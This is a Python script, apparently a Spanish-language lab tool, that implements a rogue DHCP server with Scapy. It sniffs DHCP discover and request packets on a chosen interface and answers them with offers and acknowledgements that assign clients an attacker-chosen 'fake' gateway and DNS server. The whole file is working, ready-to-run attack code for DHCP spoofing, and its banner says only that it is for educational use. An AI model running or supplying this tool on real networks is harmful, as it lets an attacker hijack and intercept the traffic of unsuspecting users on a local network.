#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.arch import get_if_hwaddr
from scapy.utils import mac2str
import ipaddress
import sys
import os

class ServidorDHCPFalso:
    def __init__(self, interfaz, ip_servidor, gateway, dns, mascara, rango_inicio, num_ips):
        self.interfaz = interfaz
        self.ip_servidor = str(ip_servidor)
        self.gateway = str(gateway)
        self.dns = str(dns)
        self.mascara = str(mascara)
        
        try:
            self.mac_servidor = get_if_hwaddr(interfaz)
        except:
            print(f"[!] Error: No se pudo obtener la MAC de la interfaz {interfaz}")
            sys.exit(1)
        
        self.pool_ips = self.generar_pool(rango_inicio, num_ips)
        self.ips_asignadas = {}
        self.ofertas_pendientes = {}
        
    def generar_pool(self, ip_inicio, cantidad):
        pool = []
        try:
            ip_obj = ipaddress.IPv4Address(ip_inicio)
            for i in range(cantidad):
                pool.append(str(ip_obj + i))
            return pool
        except Exception as e:
            print(f"[!] Error al generar pool de IPs: {e}")
            return []
    
    def asignar_ip(self, mac):
        if mac in self.ips_asignadas:
            return self.ips_asignadas[mac]
        
        if mac in self.ofertas_pendientes:
            return self.ofertas_pendientes[mac]
        
        if self.pool_ips:
            ip = self.pool_ips.pop(0)
            self.ofertas_pendientes[mac] = ip
            return ip
        
        return None
    
    def confirmar_asignacion(self, mac):
        if mac in self.ofertas_pendientes:
            self.ips_asignadas[mac] = self.ofertas_pendientes[mac]
            del self.ofertas_pendientes[mac]
    
    def enviar_dhcp_offer(self, pkt):
        try:
            mac_cliente = pkt[Ether].src
            xid = pkt[BOOTP].xid
            
            ip_ofrecida = self.asignar_ip(mac_cliente)
            if not ip_ofrecida:
                print(f"[!] No hay IPs disponibles para {mac_cliente}")
                return
            
            print(f"  [O] OFFER   -> IP: {ip_ofrecida} | MAC: {mac_cliente}")
            
            mac_bytes = bytes.fromhex(mac_cliente.replace(':', ''))
            
            dhcp_offer = (
                Ether(src=self.mac_servidor, dst=mac_cliente) /
                IP(src=self.ip_servidor, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(
                    op=2,
                    xid=xid,
                    yiaddr=ip_ofrecida,
                    siaddr=self.ip_servidor,
                    giaddr="0.0.0.0",
                    chaddr=mac_bytes + b'\x00' * 10
                ) /
                DHCP(options=[
                    ('message-type', 'offer'),
                    ('server_id', self.ip_servidor),
                    ('lease_time', 86400),
                    ('renewal_time', 43200),
                    ('rebinding_time', 64800),
                    ('subnet_mask', self.mascara),
                    ('router', self.gateway),
                    ('name_server', self.dns),
                    'end'
                ])
            )
            
            sendp(dhcp_offer, iface=self.interfaz, verbose=0)
            
        except Exception as e:
            print(f"[!] Error al enviar DHCP OFFER: {e}")
            import traceback
            traceback.print_exc()
    
    def enviar_dhcp_ack(self, pkt):
        try:
            mac_cliente = pkt[Ether].src
            xid = pkt[BOOTP].xid
            
            self.confirmar_asignacion(mac_cliente)
            ip_asignada = self.ips_asignadas.get(mac_cliente)
            
            if not ip_asignada:
                print(f"[!] No hay IP asignada para {mac_cliente}")
                return
            
            print(f"  [A] ACK     -> IP: {ip_asignada} | MAC: {mac_cliente}")
            print(f"      └─ Gateway: {self.gateway} | DNS: {self.dns}")
            
            mac_bytes = bytes.fromhex(mac_cliente.replace(':', ''))
            
            dhcp_ack = (
                Ether(src=self.mac_servidor, dst=mac_cliente) /
                IP(src=self.ip_servidor, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(
                    op=2,
                    xid=xid,
                    yiaddr=ip_asignada,
                    siaddr=self.ip_servidor,
                    giaddr="0.0.0.0",
                    chaddr=mac_bytes + b'\x00' * 10
                ) /
                DHCP(options=[
                    ('message-type', 'ack'),
                    ('server_id', self.ip_servidor),
                    ('lease_time', 86400),
                    ('renewal_time', 43200),
                    ('rebinding_time', 64800),
                    ('subnet_mask', self.mascara),
                    ('router', self.gateway),
                    ('name_server', self.dns),
                    'end'
                ])
            )
            
            sendp(dhcp_ack, iface=self.interfaz, verbose=0)
            print()
            
        except Exception as e:
            print(f"[!] Error al enviar DHCP ACK: {e}")
            import traceback
            traceback.print_exc()
    
    def procesar_paquete(self, pkt):
        if DHCP in pkt:
            try:
                dhcp_options = dict([(opt[0], opt[1]) for opt in pkt[DHCP].options if isinstance(opt, tuple)])
                mac_cliente = pkt[Ether].src
                
                if dhcp_options.get('message-type') == 1:
                    print(f"\n[D] DISCOVER <- MAC: {mac_cliente}")
                    self.enviar_dhcp_offer(pkt)
                
                elif dhcp_options.get('message-type') == 3:
                    ip_solicitada = dhcp_options.get('requested_addr', 'N/A')
                    print(f"  [R] REQUEST <- IP solicitada: {ip_solicitada} | MAC: {mac_cliente}")
                    self.enviar_dhcp_ack(pkt)
                
                elif dhcp_options.get('message-type') == 7:
                    print(f"  [!] RELEASE <- MAC: {mac_cliente}")
                    if mac_cliente in self.ips_asignadas:
                        ip_liberada = self.ips_asignadas[mac_cliente]
                        del self.ips_asignadas[mac_cliente]
                        self.pool_ips.append(ip_liberada)
                        print(f"      └─ IP {ip_liberada} devuelta al pool")
                
            except Exception as e:
                print(f"[!] Error procesando paquete: {e}")
    
    def iniciar_servidor(self):
        print(f"\n[*] Esperando solicitudes DHCP... (Ctrl+C para detener)")
        print(f"[*] Proceso DORA: [D]iscover → [O]ffer → [R]equest → [A]ck")
        print("="*70 + "\n")
        
        try:
            sniff(
                iface=self.interfaz,
                filter="udp and (port 67 or port 68)",
                prn=self.procesar_paquete,
                store=0
            )
        except KeyboardInterrupt:
            print("\n\n" + "="*70)
            print("[*] Servidor DHCP detenido")
            print(f"[*] IPs asignadas: {len(self.ips_asignadas)}")
            print(f"[*] IPs disponibles: {len(self.pool_ips)}")
            if self.ips_asignadas:
                print("\n[*] Asignaciones activas:")
                for mac, ip in self.ips_asignadas.items():
                    print(f"    {ip} -> {mac}")
        except Exception as e:
            print(f"[!] Error en el servidor: {e}")


def mostrar_banner():
    banner = """
    ╔══════════════════════════════════════════════════════════╗
    ║         DHCP SPOOFING - SERVIDOR DHCP FALSO             ║
    ║              Proceso DORA Completo                       ║
    ║                 USO EDUCATIVO                            ║
    ╚══════════════════════════════════════════════════════════╝
    """
    print(banner)


def validar_ip(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except:
        return False


def calcular_ips_disponibles(mascara):
    try:
        red = ipaddress.IPv4Network(f"0.0.0.0/{mascara}", strict=False)
        return red.num_addresses - 2
    except:
        return 0


def menu_principal():
    mostrar_banner()
    
    print("[*] Configuración del servidor DHCP falso\n")
    
    interfaz = input("Interfaz de red (ej: eth0, wlan0): ").strip()
    if not interfaz:
        print("[!] Interfaz inválida")
        sys.exit(1)
    
    print("\nMáscaras comunes:")
    print("  255.255.255.0   (/24) - 254 hosts")
    print("  255.255.255.128 (/25) - 126 hosts")
    print("  255.255.255.192 (/26) - 62 hosts")
    print("  255.255.255.224 (/27) - 30 hosts")
    print("  255.255.255.240 (/28) - 14 hosts")
    print("  255.255.255.248 (/29) - 6 hosts")
    
    mascara = input("\nMáscara de subred [255.255.255.0]: ").strip()
    if not mascara:
        mascara = "255.255.255.0"
    
    max_ips = calcular_ips_disponibles(mascara)
    print(f"[*] Máxima de IPs disponibles con esta máscara: {max_ips}")
    
    rango_inicio = input("\nIP inicial del rango (ej: 10.0.0.100): ").strip()
    if not validar_ip(rango_inicio):
        print("[!] IP inválida")
        sys.exit(1)
    
    num_ips = input(f"Cantidad de IPs a asignar (máx {max_ips}) [50]: ").strip()
    num_ips = int(num_ips) if num_ips else 50
    
    if num_ips > max_ips:
        print(f"[!] Advertencia: Estás asignando más IPs ({num_ips}) que las disponibles ({max_ips})")
        confirmar = input("¿Continuar de todas formas? (s/n): ").strip().lower()
        if confirmar != 's':
            sys.exit(0)
    
    ip_servidor = input("\nIP del servidor DHCP falso [10.0.0.254]: ").strip()
    if not ip_servidor:
        ip_servidor = "10.0.0.254"
    
    gateway = input("Gateway falso [10.0.0.1]: ").strip()
    if not gateway:
        gateway = "10.0.0.1"
    
    dns = input("DNS falso [8.8.8.8]: ").strip()
    if not dns:
        dns = "8.8.8.8"
    
    print("\n" + "="*70)
    print(f"[*] Máscara: {mascara}")
    print(f"[*] Rango: {rango_inicio} + {num_ips} IPs")
    print("="*70)
    
    iniciar = input("\n[?] ¿Iniciar servidor DHCP falso? (s/n): ").strip().lower()
    
    if iniciar == 's':
        try:
            ip_fin = str(ipaddress.IPv4Address(rango_inicio) + num_ips - 1)
        except:
            ip_fin = "N/A"
        
        print("\n" + "="*70)
        print(f"[*] Pool de IPs generado: {rango_inicio} - {ip_fin}")
        print(f"[*] Total de IPs disponibles: {num_ips}")
        print("="*70)
        print(f"\n[*] SERVIDOR DHCP FALSO ACTIVO EN: {interfaz}")
        print("="*70)
        print(f"[*] IP del servidor: {ip_servidor}")
        print(f"[*] Gateway falso: {gateway}")
        print(f"[*] DNS falso: {dns}")
        print(f"[*] Máscara de red: {mascara}")
        print("="*70)
        
        servidor = ServidorDHCPFalso(
            interfaz=interfaz,
            ip_servidor=ip_servidor,
            gateway=gateway,
            dns=dns,
            mascara=mascara,
            rango_inicio=rango_inicio,
            num_ips=num_ips
        )
        
        servidor.iniciar_servidor()
    else:
        print("[*] Operación cancelada")


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Este script requiere privilegios de root")
        sys.exit(1)
    
    try:
        menu_principal()
    except KeyboardInterrupt:
        print("\n\n[*] Saliendo...")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error fatal: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

